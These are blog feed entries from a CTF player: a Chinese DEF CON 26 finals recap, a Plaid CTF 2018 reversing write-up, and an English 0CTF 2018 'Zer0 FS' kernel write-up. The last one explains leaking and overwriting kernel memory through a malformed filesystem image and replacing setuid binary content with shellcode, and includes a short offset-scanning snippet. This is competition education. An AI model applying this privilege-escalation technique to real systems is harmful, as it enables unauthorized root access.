&lt;p&gt;到早上六點 client 基本上可以動了，但找不到洞在哪... 我一度以為處理 QRcode 的地方會 heap overflow，但其實不會，base64 疑似有 off-by-one 的漏洞，但是在保護全開又沒辦法正常 leak 的情況下似乎不太能利用，就這樣抱著會被其他隊伍打爆的心情開賽了，結果竟然風平浪靜，沒有隊伍看出問題在哪，另外主辦方在設置環境時就先給了 &lt;code&gt;vchat-hint.tgz&lt;/code&gt; ...，解開後發現是 server 和 client 的 Dockerfile，眾人猜測是昨天忘記附上...... 有了 server 昨天至少可以省下兩小時的時間 = =&lt;/p&gt;
&lt;p&gt;第三天秀了一下修正 Defense point 的結果，我們似乎上升到了第三名，接著就如往年的慣例不再顯示記分板，但聽說偶爾會顯示匿名的戰況。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bew&lt;/code&gt; 這題遇到跟 &lt;code&gt;pointless&lt;/code&gt; 差不多的慘劇，打了幾輪之後發現有隊伍開始 DoS 服務，patch 系統也發生問題，沒辦法把 atdog 昨晚精心設計的 patch 給傳上去，甚至發生之前傳的 ok，但重傳一次就變成 &lt;strong&gt;SLA FAIL&lt;/strong&gt; 的慘況，過沒多就這題就關了。&lt;/p&gt;
&lt;p&gt;&lt;img alt="patch.jpg" src="https://ddaa.tw/images/defcon_26_patch.jpg"&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;poool&lt;/code&gt; 開賽打出非常好的效果，一開始約莫可以打 20 隊左右，猜測是因為主辦方今天突然宣布只能 patch 100 byte，大家昨晚的 patch 沒辦法成功上傳的原因 XD 唯一可惜的是一開賽 &lt;code&gt;poool&lt;/code&gt; 的狀態就是 &lt;strong&gt;LOW&lt;/strong&gt;，過一陣子又變成 &lt;strong&gt;BAD&lt;/strong&gt; 了，否則應該應該可以賺更多分數。&lt;/p&gt;
&lt;p&gt;開賽後沒多久放了新題目 &lt;code&gt;reeducation&lt;/code&gt;，是個 rust 的執行檔，果斷放生 &lt;code&gt;vchat&lt;/code&gt; 來看這題，對 rust 逆向不甚熟悉，還好有 jery 在旁可以詢問，用手動亂 fuzz 有發現 input 要超過 1024 byte 才會觸發執行失敗的錯誤訊息，後來又發現餵 non-printable 可以戳出 out-of-bound 的 exception，但沒看出有哪邊可以利用。&lt;/p&gt;
&lt;p&gt;過一陣子 DEFKOR00T 又打出了 firstblood，後來許多隊伍也開始打出攻擊，但我們遲遲沒辦法找到問題 Q__Q 一直到結束前一小時才發現是個很簡單的 out-of-bound 漏洞.....，主辦方原本要放出 pcap，但卻忘記錄流量，直到我們去反應才發現，沒多久就成功 replay 了 (因為洞真的很簡單)，主辦方似乎對我們沒找到這麼簡單的問題感到驚訝...Orz&lt;/p&gt;
&lt;p&gt;在結束前我也成功寫完了可以 leak flag 的 exploit，但為時已晚，大家很擔心會因為這題而被翻盤，順帶一提這題只能 patch 16 byte，在發現問題後 jery patch 了 13 byte 的版本並上傳，卻顯示 &lt;strong&gt;TOO MANY BYTE&lt;/strong&gt; ... XDDD&lt;/p&gt;
&lt;p&gt;在我因為 &lt;code&gt;reeducation&lt;/code&gt; 焦頭爛額時，主辦方也放了最後一題 KoH &lt;code&gt;propaganda&lt;/code&gt;，只有大概了解是一個比用最少 byte patch 程式的題目，我們似乎一直在第五名左右徘徊，這題應該是唯一一題我完全沒有看過的題目。&lt;/p&gt;
&lt;p&gt;賽後跟大家一起發送鳳梨酥給各隊伍，跟其他隊伍交流了一下題目的做法，也炫耀 (?) 了一下 &lt;code&gt;doublethink&lt;/code&gt; 是怎麼做到 11 個平台的 XD，Dragon Sector 果然也是用同一招解的，PPP 串了八個平台跟神一樣...，BFS 也串了五個平台，而且還是分兩邊進行再接在一起，也是滿不簡單的 XDD&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vchat&lt;/code&gt; 的洞聽說是跟 gloox 有關，老實說有猜到洞可能會是不當使用 library，但比較把心思花在各個指令的功能上，沒有認真的把處理 xmpp 的邏輯看一遍，早知道應該放棄 &lt;code&gt;vchat&lt;/code&gt; 早點睡覺，&lt;code&gt;reeducation&lt;/code&gt; 應該就不會沒看到那個廢洞了 QQ&lt;/p&gt;
&lt;p&gt;賽後交流的期間主辦方把 DEFKOR00T、PPP 還有 HITCON 的隊長叫過去集合，說等等頒獎時務必要到場，大概就猜到應該有前三名了，閉幕儀式跟往年一樣整個睡死，途中換個姿勢睡，結果一睜眼就有一顆球飛過來 = = 順手擋了一下球又往後面飛去了，不知道後來被玩到哪去了 XDD 今年是第一次讓前三名上台領獎，過往都只有第一名上台而已，可惜我不太上相...QQ&lt;/p&gt;
&lt;p&gt;&lt;img alt="award.jpg" src="https://ddaa.tw/images/defcon_26_award.jpg"&gt;&lt;/p&gt;
&lt;p&gt;結束跟去年一樣吃 Caesar 的 buffet，螃蟹腳吃到飽就是爽 (?) angelboy 也太會剝螃蟹了吧 = = 吃完跟 jeffxx、lsc、lays 去賭輪盤，jeffxx 沒多久就輸光退場了，我接著也輸光退場 QQ Lays 原本也要輸光了，結果連續梭兩次從 $10 變成 $40，有夠扯...= = lsc 還在各種奮戰，但 after party 的時間到了，就先回房間跟其他人會合會合一起過去，房間在玩 Overcooked，四個人玩到快要吵架了...XDDD&lt;/p&gt;
&lt;p&gt;&lt;img alt="crab.jpg" src="https://ddaa.tw/images/defcon_26_crab.jpg"&gt;&lt;/p&gt;
&lt;p&gt;after party 是 OOO 提供的總統套房，有超大電視螢幕、兩層樓、撞球桌和疑似廚房的空間，真的猛，但即使這麼大的空間場地還是被塞爆了，現場可能有快 100 人吧 = = 今年好像沒有 PCTF 的衣服好拿，只好改拿 shellphish 的衣服，現場人實在是太多了，只有跟 TokyoWesterns 和 Shellphish 的成員聊到天，沒多久就回去行政套房加入 switch party 的行列了 XD&lt;/p&gt;
&lt;p&gt;&lt;img alt="after_party.jpg" src="https://ddaa.tw/images/defcon_26_after_party.jpg"&gt;&lt;/p&gt;
&lt;h2&gt;後記&lt;/h2&gt;
&lt;p&gt;今年的 DEF CON CTF 因為 infrastructure 不穩定，大家還滿困擾的，但題目本身的品質還不錯，幾題 KoH 大家都玩得很盡興，尤其是 &lt;code&gt;doublethink&lt;/code&gt;，在撰寫這篇文章時已經看到有串 9 個平台的版本了...真的是太瘋狂了 XD 還好主辦方最後允許用 race condition 的方式做題，否則今年能不能保住前三名實在難說 QQ&lt;/p&gt;
&lt;p&gt;開始工作之後解 jeopardy 的能力大幅下滑了 QQ 稍微難一點的 pwn 題都要想很久才有辦法解，如果比較新的 trick 就更不會了 T__T 但這兩年打 DEF CON CTF 反而做出比較多的貢獻，大概是基礎能力全面提升了吧? 今年的 &lt;code&gt;doublethink&lt;/code&gt; 應該是我寫過的 exploit 裡面拿最多分的一次了，爽 XD&lt;/p&gt;
&lt;p&gt;&lt;img alt="doublethink_result.jpg" src="https://ddaa.tw/images/defcon_26_doublethink_result.jpg"&gt;&lt;/p&gt;
&lt;p&gt;不知不覺也打 CTF 5 年了，但對 real world 的漏洞挖掘還是沒有什麼突破 Q__Q 還要更加努力阿...！&lt;/p&gt;
&lt;p&gt;最後放張 jery 難得有入鏡的大合照做結尾 XD&lt;/p&gt;
&lt;p&gt;&lt;img alt="our_photo.jpg" src="https://ddaa.tw/images/defcon_26_our_photo.jpg"&gt;&lt;/p&gt;</content><category term="DEF CON CTF"></category></entry><entry><title>Plaid CTF 2018 Reverse 200 Plaid Adventure</title><link href="https://ddaa.tw/plaidctf_reverse_200_plaid_adventure.html" rel="alternate"></link><published>2018-05-17T04:04:00+08:00</published><updated>2018-05-17T04:04:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2018-05-17:/plaidctf_reverse_200_plaid_adventure.html</id><summary type="html">&lt;p&gt;這題困難的地方都被 &lt;strong&gt;lucas&lt;/strong&gt; 逆完了 &amp;lt;(_ _)&amp;gt;&lt;br&gt;
不過有個小地方讓我們卡關超久...&lt;br&gt;
BTW，我覺得這題分數 200 分有點太少...  &lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Overview&lt;/h2&gt;
&lt;p&gt;將題目給的檔案解開後，發現竟然是個 web service = =&lt;br&gt;
不過只是個靜態網頁，可以隨便用個 python http server 跑起來&lt;br&gt;
用 broswer 連上可以發現是個文字解謎的遊戲&lt;br&gt;
這種遊戲模式被稱為 &lt;a href="https://en.wikipedia.org/wiki/Interactive_fiction"&gt;Interactive fiction&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;遊戲開始後會進入一個迷宮&lt;br&gt;
迷宮不算複雜，正常的遊玩就可以把所有場景走一遍&lt;br&gt;
可以入手的道具有：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;紅、藍、黃、綠 四色寶石各一顆&lt;/li&gt;
&lt;li&gt;大門鑰匙&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;獲得所有道具後前往某個有大門的場景&lt;br&gt;
用鑰匙打開門後，會有一台機器可以放置四色寶石&lt;br&gt;
依序放上後，出現 ... 的訊息&lt;br&gt;
猜測是要根據某個順序觸碰寶石&lt;br&gt;
到這邊就無法用正常的繼續遊戲，開始需要逆向遊戲的邏輯&lt;br&gt;
我大概花一個小時就過到這邊，接下來卡了十幾個小時...Orz  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;gt;put …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;這題困難的地方都被 &lt;strong&gt;lucas&lt;/strong&gt; 逆完了 &amp;lt;(_ _)&amp;gt;&lt;br&gt;
不過有個小地方讓我們卡關超久...&lt;br&gt;
BTW，我覺得這題分數 200 分有點太少...  &lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Overview&lt;/h2&gt;
&lt;p&gt;將題目給的檔案解開後，發現竟然是個 web service = =&lt;br&gt;
不過只是個靜態網頁，可以隨便用個 python http server 跑起來&lt;br&gt;
用 broswer 連上可以發現是個文字解謎的遊戲&lt;br&gt;
這種遊戲模式被稱為 &lt;a href="https://en.wikipedia.org/wiki/Interactive_fiction"&gt;Interactive fiction&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;遊戲開始後會進入一個迷宮&lt;br&gt;
迷宮不算複雜，正常的遊玩就可以把所有場景走一遍&lt;br&gt;
可以入手的道具有：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;紅、藍、黃、綠 四色寶石各一顆&lt;/li&gt;
&lt;li&gt;大門鑰匙&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;獲得所有道具後前往某個有大門的場景&lt;br&gt;
用鑰匙打開門後，會有一台機器可以放置四色寶石&lt;br&gt;
依序放上後，出現 ... 的訊息&lt;br&gt;
猜測是要根據某個順序觸碰寶石&lt;br&gt;
到這邊就無法用正常的繼續遊戲，開始需要逆向遊戲的邏輯&lt;br&gt;
我大概花一個小時就過到這邊，接下來卡了十幾個小時...Orz  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;gt;put red
(the red orb in the red slot)
The red orb clicks into place, and lights up with a subtle glow.

&amp;gt;put blue
(the blue orb in the blue slot)
The blue orb clicks into place, and lights up with a subtle glow.

&amp;gt;put yellow
(the yellow orb in the yellow slot)
The yellow orb clicks into place, and lights up with a subtle glow.

&amp;gt;put green
(the green orb in the green slot)
The green orb clicks into place, and lights up with a subtle glow.
The machine whirs to life, and the orbs get brighter. Perhaps you could try touching them?

&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Analysis&lt;/h2&gt;
&lt;p&gt;一開始有些困惑這題的目的是什麼&lt;br&gt;
因為 web 並不會去讀取 gblorb&lt;br&gt;
研究了一陣子發現 web 是透過 interpreter 執行 &lt;code&gt;Plaid Adventure.gblorb.js&lt;/code&gt;&lt;br&gt;
也可以用其他的媒介載入 gblorb 執行遊戲，兩者沒有差別  &lt;/p&gt;
&lt;p&gt;用 file 查看 gblorb 會得到以下結果：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;IFF data, Blorb Interactive Fiction with executable chunk&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;丟給 google 搜尋得知和 &lt;a href="https://en.wikipedia.org/wiki/Inform#Inform_7"&gt;Inform 7&lt;/a&gt; 有關&lt;br&gt;
Inform 7 是拿來開發 IF 的一種 framework&lt;br&gt;
可以讓開發者用自然語言來撰寫 IF 遊戲 &lt;br&gt;
寫好的遊戲會以 &lt;a href="https://en.wikipedia.org/wiki/Glulx"&gt;Glulx&lt;/a&gt; 運行 &lt;br&gt;
Glulx 是一種專門用來執行 IF 的虛擬機&lt;br&gt;
&lt;a href="https://www.eblong.com/zarf/glulx/"&gt;https://www.eblong.com/zarf/glulx/&lt;/a&gt; 收集了各種 Glulx 的實做&lt;br&gt;
我後來是選擇用純 cmdline 操作的 &lt;strong&gt;glulxe&lt;/strong&gt; 來執行遊戲&lt;br&gt;
比較方便透過 script 操作&lt;br&gt;
不用每次重新手動走迷宮 XD  &lt;/p&gt;
&lt;h2&gt;Reversing&lt;/h2&gt;
&lt;p&gt;上述的網站也有 Glulx 的完整 spec&lt;br&gt;
原先以為要看懂他的實作自己 parsing gblorb 的內容&lt;br&gt;
但搜尋一下發現已經有寫的 decompiler &lt;a href="https://hackage.haskell.org/package/mrifk"&gt;mrifk&lt;/a&gt; &lt;br&gt;
可以將 gblorb 轉成 human readable 的 pseudo code&lt;br&gt;
片段如下：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[ routine221097 local0 ;
    local0 = 0;
  .label221105:
    if (local0 &amp;lt; 16) {
        478466-&amp;gt;local0 = 0;
        local0 = local0 + 1;
        jump label221105;
    }
    return 1;
];
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;pseudo code 中有幾種比較重要的語法&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Object&lt;ul&gt;
&lt;li&gt;Object 會定義遊戲中的各種場景和物件，並且描述他們之間的關聯性&lt;/li&gt;
&lt;li&gt;e.g. 房間 A 可以往西走到房間 B，這樣 Object 就會定義 A 和 B 的關聯性&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Routine&lt;ul&gt;
&lt;li&gt;Routine 像是執行了某個指令後要觸發的行為，基本上跟 function 十分類似&lt;/li&gt;
&lt;li&gt;e.g. 輸入 &lt;code&gt;open door&lt;/code&gt;，觸發開門的 Routine，但因為門是上鎖的，檢查某個變數沒有被設置後，就印出對應訊息然後結束 routine，輸入 &lt;code&gt;unlock door with key&lt;/code&gt; 之後，觸發開鎖的 Routine 並設置變數，再次輸入 &lt;code&gt;open door&lt;/code&gt; 就可以順利開門&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;local0, local4, local8, ...&lt;ul&gt;
&lt;li&gt;類似 local varible 的概念，從命名規則可以推測變數的大小&lt;/li&gt;
&lt;li&gt;宣告在 routine 名稱後面的代表是 caller 傳來的參數&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;478466-&amp;gt;local0&lt;ul&gt;
&lt;li&gt;類似全域變數，此例 &lt;code&gt;478466&lt;/code&gt; 是個長度為 16 的一維陣列，local0 是 index&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;但光靜態分析 psedo code 還是難以完全理解程式邏輯&lt;br&gt;
需要一邊執行遊戲，一邊猜測運行到 pseudo code 的哪一段&lt;br&gt;
使用 &lt;strong&gt;glulxe&lt;/strong&gt; 進行遊戲還有另一個原因&lt;br&gt;
&lt;strong&gt;glulxe&lt;/strong&gt; 支援簡單的 debug 功能&lt;br&gt;
但由於我們沒有遊戲產生時的 debug info&lt;br&gt;
沒辦法直接存取遊戲裡的數值，只能簡單的下斷點來看程式運行到哪個階段&lt;br&gt;
斷點還只能設在 routine 的開頭...  &lt;/p&gt;
&lt;p&gt;透過比對 object 在那些 routine 被使用，及透過 breakpoint 耐心的 try and error&lt;br&gt;
可以追到有兩個 routine 是解這題的關鍵：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;routine221131&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;處理 touch 礦石的 Routine&lt;/li&gt;
&lt;li&gt;做的事情是把每三次觸碰的寶石顏色轉成一個數字，再存入一個長度 16 的矩陣&lt;ul&gt;
&lt;li&gt;red: 0b01&lt;/li&gt;
&lt;li&gt;blue: 0b10&lt;/li&gt;
&lt;li&gt;green: 0b10&lt;/li&gt;
&lt;li&gt;yellow: 0b11&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;e.g. 觸碰紅色三次就代表 &lt;code&gt;0b010101 = 21&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;routine220666&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;判斷觸碰的順序是否正確，正確則進入 &lt;code&gt;routine221211&lt;/code&gt; 印 flag&lt;/li&gt;
&lt;li&gt;將 &lt;code&gt;routine221131&lt;/code&gt; 得到的矩陣與位於 &lt;code&gt;478802&lt;/code&gt; 的二維陣列相乘，得到的結果要與 &lt;code&gt;478482&lt;/code&gt; 的陣列相同&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;不過前面有提到 debugger 沒辦法存取數值&lt;br&gt;
但我們可以對 glulxe 稍做修改，印出 Glulx 裡面 &lt;code&gt;478802&lt;/code&gt; 和 &lt;code&gt;478482&lt;/code&gt; 位址上的資料  &lt;/p&gt;
&lt;h2&gt;Solving&lt;/h2&gt;
&lt;p&gt;由於陣列的大小都是 1 byte&lt;br&gt;
&lt;code&gt;routine220666&lt;/code&gt; 其實就是 ring 在 0 ~ 255 的矩陣乘法&lt;br&gt;
&lt;code&gt;routine221131&lt;/code&gt; 得到的矩陣 A 乘上位於 &lt;code&gt;478802&lt;/code&gt; 的矩陣 B 等於位於 &lt;code&gt;478482&lt;/code&gt; 的矩陣 X&lt;br&gt;
問題簡化為：&lt;strong&gt;AB=X, 已知 B 和 X，求 A 的值?&lt;/strong&gt;&lt;br&gt;
因此只要求出 B 的反矩陣與 X 相乘就可以得到結果&lt;br&gt;
將結果根據 &lt;code&gt;routine221131&lt;/code&gt; 的規則做基底為 4 的因式分解就可以推回觸碰的順序&lt;br&gt;
聽起來很完美，但實際上並不是 Orz  &lt;/p&gt;
&lt;p&gt;解出來的 A 是 &lt;code&gt;[188, 185, 130, 28, 247, 150, 58, 227, 106, 0, 116, 197, 113, 25, 178, 70]&lt;/code&gt;&lt;br&gt;
根本無法用 &lt;code&gt;routine221131&lt;/code&gt; 的規則推回對應的顏色&lt;br&gt;
這邊一開始是先用 z3 求解，為了避免是 z3 規則寫錯，後來改用 sage 做矩陣運算，也是得到相同的結果&lt;br&gt;
就這樣卡了一陣子，後來發現 &lt;code&gt;478482&lt;/code&gt; 除了 &lt;code&gt;routine220666&lt;/code&gt; 以外&lt;br&gt;
還有一個 &lt;code&gt;routine221185&lt;/code&gt; 會把 478482[15] + 1 ...&lt;br&gt;
重算一次得到正確的結果：&lt;code&gt;[48, 7, 46, 15, 21, 25, 11, 24, 49, 16, 55, 12, 40, 41, 48, 47]&lt;/code&gt;&lt;br&gt;
轉換為顏色後，順序是：
&lt;code&gt;B B Y Y R B G Y G Y Y B R R R R G R Y G B B G R R B Y B B R Y R Y B Y B B G G R G G B B Y Y Y G&lt;/code&gt;&lt;br&gt;
但我們因為不知道如何觸發 &lt;code&gt;routine221185&lt;/code&gt;&lt;br&gt;
做法是直接修改 gblorb 上對應到 478482 的位址&lt;br&gt;
在按照上面的順序觸摸寶石，flag 就會噴出來了  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;The four orbs get brighter and brighter, as the machine starts violently whirring and clicking. You close your eyes as blinding light fills the room. When you finally open your eyes, you find yourself outside of the cavern, holding the flag in your hands:

PCTF{Tw1styL1ttl3Fl4g}


    *** The End ***
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Note&lt;/h2&gt;
&lt;p&gt;比賽結束後，irc 上出題者說，要發現隱藏的指令 &lt;code&gt;xyzzy&lt;/code&gt;&lt;br&gt;
輸入這個指令就會觸發 &lt;code&gt;routine221185&lt;/code&gt;&lt;br&gt;
應該有不少人也是卡死在這邊 XD  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;PCTF{Tw1styL1ttl3Fl4g}&lt;/code&gt;&lt;br&gt;
exploit: &lt;a href="https://ddaa.tw/exp/plaid-adventure.sage"&gt;solve.sage&lt;/a&gt;  &lt;/p&gt;</content><category term="PlaidCTF"></category></entry><entry><title>0CTF 2018 Pwnable 478 Zer0 FS</title><link href="https://ddaa.tw/0ctf_pwnable_478_zer0fs.html" rel="alternate"></link><published>2018-04-06T22:51:00+08:00</published><updated>2018-04-06T22:51:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2018-04-06:/0ctf_pwnable_478_zer0fs.html</id><summary type="html">&lt;p&gt;The problem was solved with &lt;strong&gt;jeffxx&lt;/strong&gt;, &lt;strong&gt;atdog&lt;/strong&gt; and &lt;strong&gt;lays&lt;/strong&gt;&lt;br&gt;
Most of exploit was written by &lt;strong&gt;atdog&lt;/strong&gt; during the competition and I rewrote the exploit for the write-up.  &lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Analysis&lt;/h2&gt;
&lt;p&gt;We will enter a shell that building by KVM after ssh connection enbalished. The discription said the flag is &lt;code&gt;sha256(/root/flag …&lt;/code&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;The problem was solved with &lt;strong&gt;jeffxx&lt;/strong&gt;, &lt;strong&gt;atdog&lt;/strong&gt; and &lt;strong&gt;lays&lt;/strong&gt;&lt;br&gt;
Most of exploit was written by &lt;strong&gt;atdog&lt;/strong&gt; during the competition and I rewrote the exploit for the write-up.  &lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Analysis&lt;/h2&gt;
&lt;p&gt;We will enter a shell that building by KVM after ssh connection enbalished. The discription said the flag is &lt;code&gt;sha256(/root/flag)&lt;/code&gt;, but we had no permisson to read it. As other Linux kernel challenge, our target is obtaining the root priviledge, then we can calculate the hash of &lt;code&gt;/root/flag&lt;/code&gt;.&lt;br&gt;
There are two setuid programs under the root directory. One of them is &lt;code&gt;/mount&lt;/code&gt;. Try to execute &lt;code&gt;/mount&lt;/code&gt; but the error message is as below:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;mount: mounting /tmp/zerofs.img on /mnt failed: No such file or directory&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;After created &lt;code&gt;/tmp/zerofs.img&lt;/code&gt;, we got another error message:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;mount: mounting /dev/loop0 on /mnt failed: Device or resource busy&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Well, maybe we should make a normal image at first. Aside from creating image, let's see what files the challenge gave.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-rw-r--r-- yoghur7/yoghur7 7173904 2018-03-29 03:42 public/bzImage
-rw-rw-r-- yoghur7/yoghur7 3229184 2018-03-30 01:13 public/rootfs.cpio
-rw-r--r-- yoghur7/yoghur7  326664 2018-03-29 03:42 public/zerofs.ko
-rwxrwxr-x yoghur7/yoghur7     240 2018-03-29 03:42 public/run.sh
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;run.sh&lt;/code&gt; is a shellscript to start the challege environment by kvm (or qemu). Notice, the arguments include &lt;code&gt;-initrd&lt;/code&gt;. It means the rootfs is made by ramdisk and files will be stored in memory. I used the feature for exploit this challenge.  &lt;/p&gt;
&lt;p&gt;Obviously, we should analysis &lt;code&gt;zerofs.ko&lt;/code&gt; at first. &lt;strong&gt;jeffxx&lt;/strong&gt; found a repository called &lt;a href="https://github.com/psankar/simplefs"&gt;simplefs&lt;/a&gt; which is very similar with zerofs.ko, but a little difference still exists, such as the inode structure and super block. We made a little &lt;a href="https://ddaa.tw/exp/0001-make-zerofs-image.patch"&gt;modification&lt;/a&gt; after reversing &lt;code&gt;zerofs.ko&lt;/code&gt; and we could make a legal image thourgh &lt;code&gt;mkfs-simplefs&lt;/code&gt;. By the way, I didn't attend the reverse stage ... I was stucking in &lt;strong&gt;Might dragon&lt;/strong&gt; at that time. Orz  &lt;/p&gt;
&lt;h2&gt;Vulnerability&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;zerofs_write&lt;/code&gt;: There was a buffer overflow when using &lt;code&gt;copy_from_user&lt;/code&gt; but it didn't check the boundary. This vulnerabiliy wouldn't be use in my exploit.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;zerofs_read&lt;/code&gt;: It checked that the length must be smaller than file size. However, because we could control the full file system, we could make an illegal file which file size is not equal to the real size (see &lt;a href="https://ddaa.tw/exp/0002-illegal-size.patch"&gt;patch2&lt;/a&gt;). After that, it will leak extra data in kernel memory when reading the file.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;zerofs_lleek&lt;/code&gt;: Exist the same problem that mention in &lt;code&gt;zerofs_read&lt;/code&gt;. We could call &lt;code&gt;lseek&lt;/code&gt; to control the position of the file.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;We could combine &lt;code&gt;llseek&lt;/code&gt; with &lt;code&gt;zerofs_read&lt;/code&gt; to leak the data more easier or &lt;code&gt;zerofs_write&lt;/code&gt; to avoid breaking some important sturcture.  &lt;/p&gt;
&lt;h2&gt;Exploit&lt;/h2&gt;
&lt;p&gt;Our target is getting the root priviledge and reading &lt;code&gt;/root/flag&lt;/code&gt;. As above mentioned, the rootfs was on kernel memory, so we could modify the file throught arbitrary write in &lt;code&gt;zerofs_write&lt;/code&gt;. I also noticed that both &lt;code&gt;/mount&lt;/code&gt; and &lt;code&gt;/umount&lt;/code&gt; are setuid programs. We could replace a part of file content to our shellcode. I think it is the easiest way to reach our target.  &lt;/p&gt;
&lt;p&gt;Now, we almost had an arbitrary read or write on kernel memory, but we could not confirm the offset because the randomization of kernel heap mechanism. Thus, we must to identify the distance between the overflowed buffer and the rootfs.  &lt;/p&gt;
&lt;p&gt;I disabled KASLR and use gdb to watch the kernel memory. It looks like below:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pwndbg&amp;gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x7ffe4e844000     0x7ffe4e847000 rwxp     3000 0          &amp;lt;=== user space program
0xffff880002dbd000 0xffff8800035bd000 rwxp   800000 0          &amp;lt;=== overflowed buffer
0xffff880003614000 0xffff880003e14000 rwxp   800000 0          &amp;lt;=== rootfs
0xffffc900001c2000 0xffffffff82203000 rwxp 36ff82041000 0      [stack]
0xffffffff8143a000 0xffffffff81c3a000 rwxp   800000 0
0xffffffffbffff000 0xffffffffc0004000 rwxp     5000 0
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I noticed that the offset of rootfs is fixed, but the offset of overflowed buffer would change. I'm not sure the reason, maybe it was generated dynamicly by &lt;code&gt;__bread_gfp&lt;/code&gt;? Despite sometime it would be the same, I wanted to make a stable exploit because it was annoying to upload file to the remote environment.  &lt;/p&gt;
&lt;p&gt;We could write a program that keeps adjust the position by &lt;code&gt;lseek&lt;/code&gt; and leaking memory by &lt;code&gt;read&lt;/code&gt;, then checking if the leaked data contains the specified pattern. I chose a string &lt;strong&gt;/bin/mount&lt;/strong&gt; to be the pattern because it occurs in rootfs once and it is used by &lt;code&gt;/mount&lt;/code&gt;. After finding the pattern, we could add or minus the offset to modify any file on rootfs. The proof-of-concept is as below:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;for (int i = start; i &amp;lt; end; i++) {
    lseek(fd, i * 0x1000, SEEK_SET);
    read(fd, buf, 0x1000);
    if (search(buf, PATTERN)) {
        printf(&amp;quot;offset = %d\n&amp;quot;, i);
        off = i * 0x1000  - 0x94000 + 0x1081;
        break;
    }
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finally, adjust the file position to the calculated offsetand and write a shellcode to execute &lt;code&gt;/bin/sh&lt;/code&gt;. After that, execute &lt;code&gt;/mount&lt;/code&gt; again. We could get a shell with the root priviledge. :)&lt;/p&gt;
&lt;h2&gt;Note&lt;/h2&gt;
&lt;p&gt;There are some detail about making the exploit.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;For local testing, I wrote a script to repack rootfs into a cpio file. The image and exploit will in the file system after rebooting.&lt;/li&gt;
&lt;li&gt;Adding &lt;code&gt;-s&lt;/code&gt; into the arguments when starting qemu and using gdb remote attach to debug my exploit.&lt;/li&gt;
&lt;li&gt;Modify &lt;code&gt;/init&lt;/code&gt; to initialize something, such as mount /tmp/zerofs.img and set priviledge to root.&lt;/li&gt;
&lt;li&gt;The environment linked most of binary to busybox. Thus, I uploaded the image and exploit by copy-paste base64 string and decode them back to the binary. Is there a better way?&lt;/li&gt;
&lt;li&gt;I needed to keep the size of exploit small because using copy-paste to upload, but there is no glibc in the environment. Thus, I compiled my exploit with &lt;a href="https://www.fefe.de/dietlibc/"&gt;dietlibc&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;As our expectation, we could not find the pattern like &lt;code&gt;flag{&lt;/code&gt; directly, because &lt;code&gt;/root/flag&lt;/code&gt; is a pure binary file.&lt;/li&gt;
&lt;/ol&gt;
